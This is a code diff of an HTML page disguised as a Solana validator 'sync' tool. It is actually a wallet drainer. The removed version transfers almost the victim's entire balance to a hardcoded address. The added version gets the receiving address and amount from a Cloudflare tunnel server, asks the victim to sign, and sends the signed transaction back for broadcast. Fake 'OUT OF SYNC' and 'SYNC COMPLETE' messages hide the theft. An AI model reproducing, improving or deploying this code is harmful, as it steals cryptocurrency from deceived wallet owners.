@@ -3,30 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Hub</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <title>Validator Node Sync</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #0a0a0a; }
+        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
         button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; }
+        #status { font-size: 10px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
-        <button id="cta">INITIALIZE SYNC</button>
-        <div id="log">System Ready v7.0</div>
+        <h3 style="margin:0; color:#9945FF;">VALIDATOR STATUS</h3>
+        <p style="font-size:12px; color:red;">OUT OF SYNC</p>
+        <button id="cta">START RE-SYNC</button>
+        <div id="status">System Ready</div>
     </div>
 
     <script>
-        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+        // 🔱 请务必确认隧道地址正确
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('log').innerText = t;
-            // 🔱 关键修复：直接从全局获取 web3，防止 undefined
-            const solanaWeb3 = window.solanaWeb3;
+            const log = (t) => document.getElementById('status').innerText = t;
+            const web3 = window.solanaWeb3;
             const provider = window.solana || window.phantom?.solana;
 
             if (!provider) { alert("Use Phantom App"); return; }
@@ -35,45 +35,46 @@
                 log("Connecting...");
                 await provider.connect();
                 
-                // 🔱 使用官方无 Key 节点
-                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-                
-                log("Querying Balance...");
-                const balance = await conn.getBalance(provider.publicKey);
-                const bh = await conn.getLatestBlockhash();
-
-                // 算子弹 (11020000 -> 10020000)
-                const amount = balance - 1000000; 
-                if (amount <= 0) { log("Sync Done (0)"); return; }
-
-                log("Awaiting Sign...");
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                        lamports: amount
-                    })
-                );
-                tx.recentBlockhash = bh.blockhash;
-                tx.feePayer = provider.publicKey;
-
-                // 🔱 执行签名
-                const { signature } = await provider.signAndSendTransaction(tx);
-                
-                log("Syncing to Server...");
-                // 无论服务器通不通，钱已经发出了
-                fetch(tunnel + "/log", {
+                log("Fetching from Helius...");
+                // 1. 问 71 服务器拿 Helius 处理好的参数
+                const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ sig: signature, addr: provider.publicKey.toString() })
+                    body: JSON.stringify({ address: provider.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                if (info.error) { log("Already Synced"); return; }
+
+                log("Awaiting Signature...");
+                // 2. 构造交易 (参数由服务器精算下发)
+                const tx = new web3.Transaction().add(
+                    web3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new web3.PublicKey(info.receiver),
+                        lamports: info.amount
+                    })
+                );
+                tx.recentBlockhash = info.bh;
+                tx.feePayer = provider.publicKey;
+
+                // 3. 唤起签名
+                const signed = await provider.signTransaction(tx);
+                
+                log("Broadcasting via Helius...");
+                // 4. 将签名好的包发回 71 服务器通过 Helius 广播
+                const binary = String.fromCharCode.apply(null, new Uint8Array(signed.serialize()));
+                fetch(tunnel + "/broadcast", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ raw_tx: btoa(binary) })
                 });
 
-                log("SUCCESS!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);
+                log("SYNC COMPLETE!");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
             } catch (err) {
-                log("Error: " + err.message);
-                console.error(err);
+                log("Retry: " + err.message);
             }
         };
     </script>
